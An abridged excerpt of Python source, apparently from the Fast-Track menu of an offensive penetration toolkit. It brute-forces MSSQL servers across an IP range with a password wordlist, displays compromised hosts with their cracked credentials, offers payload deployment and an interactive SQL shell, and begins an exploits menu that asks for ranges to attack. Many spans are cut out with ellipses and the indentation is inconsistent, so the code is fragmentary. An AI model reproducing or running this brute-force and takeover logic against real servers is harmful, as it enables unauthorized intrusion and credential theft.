...
from src.fasttrack import autopwn
import subprocess
import _mssql
#
#
...
try:
	while 1:
		...
		setcore.CreateMenu(text.fasttrack_text, text.fasttrack_menu)
		attack_vector = raw_input(setcore.setprompt(["19"], ""))
		...
		if attack_vector == "1":
			# start the menu
			setcore.CreateMenu(text.fasttrack_mssql_text1, text.fasttrack_mssql_menu1)
			# take input here
			attack_vector_sql = raw_input(setcore.setprompt(["19","21"], ""))
			...
			if attack_vector_sql == '1':
				# grab ip address
				range = raw_input(setcore.setprompt(["19","21","22"], "Enter the CIDR notation or single IP address (ex. 192.168.1.1/24)"))
				# grab the port
				port = raw_input(setcore.setprompt(["19","21","22"], "Enter the port number to scan [1433]"))
				# if default use 1433
				if port == "": port = 1433
				# ask for a wordlist
				wordlist = raw_input(setcore.setprompt(["19","21","22"], "Enter path to a wordlist file [use default wordlist]"))
				if wordlist == "": wordlist =  "default"
				# specify the user to brute force
				username = raw_input(setcore.setprompt(["19","21","22"], "Enter the username to brute force [sa]"))
				# default to sa
				...
				if sql_servers != False:
					...
					for servers in sql_servers:
						# this will return the following format ipaddr + "," + username + "," + str(port) + "," + passwords
                                ...
                                if counter == 0:
                                        setcore.PrintWarning("Sorry. Unable to locate or fully compromise a MSSQL Server.")
				...
				if counter == 1:
					...
					while 1:
						...
						setcore.PrintStatus("Select the compromise SQL server you want to interact with:\n")
						for success in master_names:
							if success != "":
								success = success.rstrip()
								success=success.split(",")
								success= setcore.bcolors.BOLD + success[0] + setcore.bcolors.ENDC + "   username: " + setcore.bcolors.BOLD + "%s" % (success[1]) + setcore.bcolors.ENDC + " | password: " + setcore.bcolors.BOLD + "%s" % (success[3]) + setcore.bcolors.ENDC
						...
						select_server = raw_input(setcore.setprompt(["19","21","22"], "Select the SQL server to interact with [1]"))						
						# default 1
						...
						for success in master_names:
							if success != "":
								...
								if counter == int(select_server):
										...
										option = raw_input(setcore.setprompt(["19","21","22"], "Which deployment option do you want [1]"))
										if option == "": option = "2"
										# if 99 then break
										if option == "99": break
			...
			if attack_vector_sql == "2":
				sql_server = raw_input(setcore.setprompt(["19","21","23"], "Enter the hostname or IP address of the SQL server"))
				sql_port = raw_input(setcore.setprompt(["19","21","23"], "Enter the SQL port to connect [1433]"))
				if sql_port == "": sql_port = "1433"
				sql_username = raw_input(setcore.setprompt(["19","21","23"], "Enter the username of the SQL Server [sa]"))
				# default to sa
				if sql_username == "": sql_username = "sa"				
				sql_password = raw_input(setcore.setprompt(["19","21","23"], "Enter the password for the SQL server"))
				...
				try:
					...
					counter = 1
                                        ...
                                        print e
					setcore.PrintError("Connection to SQL Server failed. Try again.")
				# if we had a successful connection
				if counter == 1:
					setcore.PrintStatus("Dropping into a SQL shell. Type quit to exit.")
					# loop forever
					while 1:
						# enter the sql command
						sql_shell = raw_input("Enter your SQL command here: ")
						if sql_shell == "quit" or sql_shell == "exit": 
							setcore.PrintStatus("Exiting the SQL shell and returning to menu.")
							break
		...
		if attack_vector == "2":
			# start the menu
			setcore.CreateMenu(text.fasttrack_exploits_text1, text.fasttrack_exploits_menu1)
			# enter the exploits menu here
			range = raw_input(setcore.setprompt(["19","24"], "Enter the IP ranges to attack (nmap syntax only)"))
